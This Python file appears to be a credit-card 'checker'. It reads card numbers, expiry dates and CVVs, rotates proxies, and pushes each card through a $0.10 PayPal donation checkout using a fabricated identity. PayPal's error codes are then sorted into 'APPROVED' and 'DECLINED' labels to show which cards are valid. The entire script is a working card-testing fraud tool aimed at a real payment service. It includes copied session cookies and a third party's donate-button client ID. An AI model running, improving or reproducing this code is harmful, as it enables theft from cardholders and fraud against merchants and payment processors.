
# ---------------- LIBRERIAS 

from parse import *
import requests
import names
import string 
import time
import base64
import secrets
import string
import random
from bs4 import BeautifulSoup

proxiess = "proxys.txt"
           
def paypal(tarjeta):
    try:
        session = requests.Session()
        with open(proxiess, 'r') as file:
            proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
       
        splitter = tarjeta.split('|')
        ccnum = splitter[0]
        mes = splitter[1]
        cvv = splitter[3]
        ano = splitter[2]
        if len(ano) == 2:
            ano = "20" + ano
            
        CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        
        inicio = time.time()
     
        headers = {
            'authority': 'www.paypal.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            # 'cookie': 'LANG=en_US%3BUS; nsid=s%3ATFm4MRwTM-zPs7D9DtmM9E9n1hpOx4iV.leWsFVLnR6Z9kZbAwi5nGr03hxhotqRG76WjnDVpUa4; x-pp-s=eyJ0IjoiMTcwMzAwMDcyNzIzOSIsImwiOiIwIiwibSI6IjAifQ; tsrce=smartcomponentnodeweb; l7_az=dcg14.slc; ts_c=vr%3D82b2aecc18c0ad117842fff8fedc137f%26vt%3D8377479c18c0aa38c847d3e2fed159e0; ts=vreXpYrS%3D1797707399%26vteXpYrS%3D1703014799%26vr%3D82b2aecc18c0ad117842fff8fedc137f%26vt%3D8377479c18c0aa38c847d3e2fed159e0%26vtyp%3Dreturn',
            'referer': 'https://ghcop.org/',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        }

        params = {
            'style.label': 'donate',
            'style.layout': 'vertical',
            'style.color': 'gold',
            'style.shape': 'rect',
            'style.tagline': 'false',
            'style.menuPlacement': 'below',
            'sdkVersion': '5.0.415',
            'components.0': 'buttons',
            'locale.country': 'US',
            'locale.lang': 'en',
            #'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVJZZHZfdkROTTJpNGJJSXA2QXNuVDduQmNTdWtZRExJLWdoZ2JiaC0xVi05OEZ2eVR2NERySU1IaS1KUm9peFRLdjMyMXJzalZGeVRhTWYmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0',
            'clientID': 'ARYdv_vDNM2i4bIIp6AsnT7nBcSukYDLI-ghgbbh-1V-98FvyTv4DrIMHi-JRoixTKv321rsjVFyTaMf',
            #'sdkCorrelationID': 'f467368e9f4db',
            'buttonSessionID': 'uid_06c4ca0345_mtk6mta6mty',
            'env': 'production',
            'buttonSize': 'huge',
            #'fundingEligibility': 'eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0',
            'platform': 'desktop',
            'experiment.enableVenmo': 'false',
            'flow': 'purchase',
            'currency': 'USD',
            'intent': 'capture',
            'commit': 'true',
            'vault': 'false',
            'enableFunding.0': 'venmo',
            'renderedButtons.0': 'paypal',
            'renderedButtons.1': 'card',
            'debug': 'false',
            'applePaySupport': 'false',
            'supportsPopups': 'true',
            'supportedNativeBrowser': 'false',
            'allowBillingPayments': 'true',
            'disableSetCookie': 'true',
        }

        response = session.get('https://www.paypal.com/smart/buttons', params=params, headers=headers).text
        
        AccessToken = parseX(response, 'AccessToken":"', '"')
        
    
        headers = {
            'authority': 'www.paypal.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {AccessToken}',
            'content-type': 'application/json',
            # 'cookie': 'LANG=en_US%3BUS; nsid=s%3ATFm4MRwTM-zPs7D9DtmM9E9n1hpOx4iV.leWsFVLnR6Z9kZbAwi5nGr03hxhotqRG76WjnDVpUa4; x-pp-s=eyJ0IjoiMTcwMzAwMDcyNzIzOSIsImwiOiIwIiwibSI6IjAifQ; tsrce=smartcomponentnodeweb; l7_az=dcg14.slc; ts_c=vr%3D82b2aecc18c0ad117842fff8fedc137f%26vt%3D8377479c18c0aa38c847d3e2fed159e0; ts=vreXpYrS%3D1797707419%26vteXpYrS%3D1703014819%26vr%3D82b2aecc18c0ad117842fff8fedc137f%26vt%3D8377479c18c0aa38c847d3e2fed159e0%26vtyp%3Dreturn',
            'origin': 'https://www.paypal.com',
            'paypal-partner-attribution-id': '',
            'prefer': 'return=representation',
            'referer': 'https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.415&components.0=buttons&locale.country=US&locale.lang=en&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVJZZHZfdkROTTJpNGJJSXA2QXNuVDduQmNTdWtZRExJLWdoZ2JiaC0xVi05OEZ2eVR2NERySU1IaS1KUm9peFRLdjMyMXJzalZGeVRhTWYmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&clientID=ARYdv_vDNM2i4bIIp6AsnT7nBcSukYDLI-ghgbbh-1V-98FvyTv4DrIMHi-JRoixTKv321rsjVFyTaMf&sdkCorrelationID=f467368e9f4db&storageID=uid_5ef2d021a4_mtk6mdk6ntq&sessionID=uid_95203e2e64_mtk6mdk6ntq&buttonSessionID=uid_06c4ca0345_mtk6mta6mty&env=production&buttonSize=huge&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&enableFunding.0=venmo&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&allowBillingPayments=true&disableSetCookie=true',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        }

        json_data = {
            'purchase_units': [
                {
                    'amount': {
                        'currency_code': 'USD',
                        'value': '0.1',
                        'breakdown': {
                            'item_total': {
                                'currency_code': 'USD',
                                'value': '0.1',
                            },
                        },
                    },
                    'items': [
                        {
                            'name': 'item name',
                            'unit_amount': {
                                'currency_code': 'USD',
                                'value': '0.1',
                            },
                            'quantity': '1',
                            'category': 'DONATION',
                        },
                    ],
                    'description': 'Juan Bermudez',
                },
            ],
            'intent': 'CAPTURE',
            'application_context': {},
        }

        response = session.post('https://www.paypal.com/v2/checkout/orders', headers=headers, json=json_data).json()
        
        id_ = response['id']
        print(id_)
        
    
        headers = {
            'authority': 'www.paypal.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            # 'cookie': 'LANG=en_US%3BUS; nsid=s%3ATFm4MRwTM-zPs7D9DtmM9E9n1hpOx4iV.leWsFVLnR6Z9kZbAwi5nGr03hxhotqRG76WjnDVpUa4; ts_c=vr%3D82b2aecc18c0ad117842fff8fedc137f%26vt%3D8377479c18c0aa38c847d3e2fed159e0; enforce_policy=ccpa; KHcl0EuY7AKSMgfvHl7J5E7hPtK=XsWG3mQmaTPhViTA1im8oFtGrrrh5y9g6BH8UeqCYdoXsHhWp5q5Nfmd7YEZIkya9FXv3Z-tNq-XhppP; ddi=96twpsz4JmylJ4HVW7ZTl9SjZYUcQ2sQTnxx-Cs0cga7dRVwi-bNjZuj61pEOhC4wdsCm0lrYq2wKxVzEcFN8EcZfMjunJJ9PyNnvXDX2rQ_FpPB; sc_f=S7V3idtHjJETXxcF9v--QKuLeju23fMqfhPZOO80BbO-5jW1j7-pgCRJ6qxmnJc3_y4Szr9H7BFhHtzfRk-YBUEb6ya6Mj0Vw2tP50; x-pp-s=eyJ0IjoiMTcwMzAxMzAzNTI0MyIsImwiOiIwIiwibSI6IjAifQ; tsrce=graphqlnodeweb; l7_az=dcg15.slc; ts=vreXpYrS%3D1797707435%26vteXpYrS%3D1703014835%26vr%3D82b2aecc18c0ad117842fff8fedc137f%26vt%3D8377479c18c0aa38c847d3e2fed159e0%26vtyp%3Dreturn',
            'origin': 'https://www.paypal.com',
            'paypal-client-context': id_,
            'paypal-client-metadata-id': id_,
            'referer': 'https://www.paypal.com/smart/card-fields?sessionID=uid_95203e2e64_mtk6mdk6ntq&buttonSessionID=uid_06c4ca0345_mtk6mta6mty&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVJZZHZfdkROTTJpNGJJSXA2QXNuVDduQmNTdWtZRExJLWdoZ2JiaC0xVi05OEZ2eVR2NERySU1IaS1KUm9peFRLdjMyMXJzalZGeVRhTWYmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&disable-card=&token=9GG88206EC475584A',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'x-app-name': 'standardcardfields',
            'x-country': 'US',
        }

        json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': id_,
                'card': {
                    'cardNumber': ccnum,
                    'expirationDate': f'{mes}/{ano}',
                    'postalCode': '10080',
                    'securityCode': cvv,
                },
                'phoneNumber': '2485345637',
                'firstName': 'TOMAS',
                'lastName': 'MARTINEZ',
                'billingAddress': {
                    'givenName': 'TOMAS',
                    'familyName': 'MARTINEZ',
                    'line1': 'Street 45th Binarie',
                    'line2': None,
                    'city': 'New York',
                    'state': 'NY',
                    'postalCode': '10080',
                    'country': 'US',
                },
                'shippingAddress': {
                    'givenName': 'TOMAS',
                    'familyName': 'MARTINEZ',
                    'line1': 'Street 45th Binarie',
                    'line2': None,
                    'city': 'New York',
                    'state': 'NY',
                    'postalCode': '10080',
                    'country': 'US',
                },
                'email': 'pzhyukjibn@hldrive.com',
                'currencyConversionType': 'PAYPAL',
            },
            'operationName': None,
        }

        resp = session.post(
            'https://www.paypal.com/graphql?fetch_credit_form_submit',
            #cookies=cookies,
            headers=headers,
            json=json_data,
        )
        
        response = resp.text
        session.close()
        
        if int(response.find('NEED_CREDIT_CARD')) > 0 :
                            jsonresponse = resp.json()
                            code = "NON_PAYABLE"
                            message = jsonresponse['errors'][0]['message']
                            
                            msg = "DECLINED ❌"
                            respuesta = message
                            end = time.time()
                            tiempo = str(inicio - end)[1:5]
                                    
                            footer_banner1 = 'https://imgur.com/ihpUqrG.jpg'
                                
                                
                       
    
                            print(code, message, "1")
        elif int(response.find('CANNOT_CLEAR_3DS_CONTINGENCY')) > 0 :
                            jsonresponse = resp.json()
                            message = jsonresponse['errors'][0]['message']
                            
                            msg = "DECLINED ❌"
                            respuesta = message
                           
        elif int(response.find('errors')) > 0 :
                            jsonresponse = resp.json()
                            try  :
                                code = jsonresponse['errors'][0]['data'][0]['code']
                            except KeyError :
                                code = 'NULL'
                            except IndexError :
                                code = 'NULL'
                            message = jsonresponse['errors'][0]['message']
                            
                            
                            if "INVALID_SECURITY_CODE" in code:
                                msg = "APPROVED CCN ✅"
                                respuesta = code
                                
                            elif "INVALID_BILLING_ADDRESS" in code:
                                msg = "APPROVED AVS✅"
                                respuesta = code
                                
                            elif "OAS_VALIDATION_ERROR" in code:
                                
                                msg = "APPROVED ✅"
                                respuesta = code
                                
                            elif "EXISTING_ACCOUNT_RESTRICTED" in code:
                                msg = "APPROVED ✅"
                                respuesta = code
                                
                            elif "VALIDATION_ERROR" in code:
                                msg = "APPROVED ✅"
                                respuesta = code
                                
                            else:
                                msg = "DECLINED ❌"
                                respuesta = code
                                print(code, message, "2")
                            end = time.time()
                            tiempo = str(inicio - end)[1:5]
                                    
                            footer_banner1 = 'https://imgur.com/ihpUqrG.jpg'
                            
        elif int(response.find('is3DSecureRequired')) > 0 :
                            
                            print("CHARGE $3")
                            end = time.time()
                            tiempo = str(inicio - end)[1:5]
                                    
                            footer_banner1 = 'https://imgur.com/ihpUqrG.jpg'
                            msg = "APPROVED ✅"
                            respuesta = "CHARGE $0,1"

        
        print(msg, "PPMAX")
        return msg, respuesta
    
    except Exception as e:
        print("Se produjo una excepción:", e)
        msg = "DECLINED ❌"
        respuesta = "Ha ocurrido un error"
        
        return msg, respuesta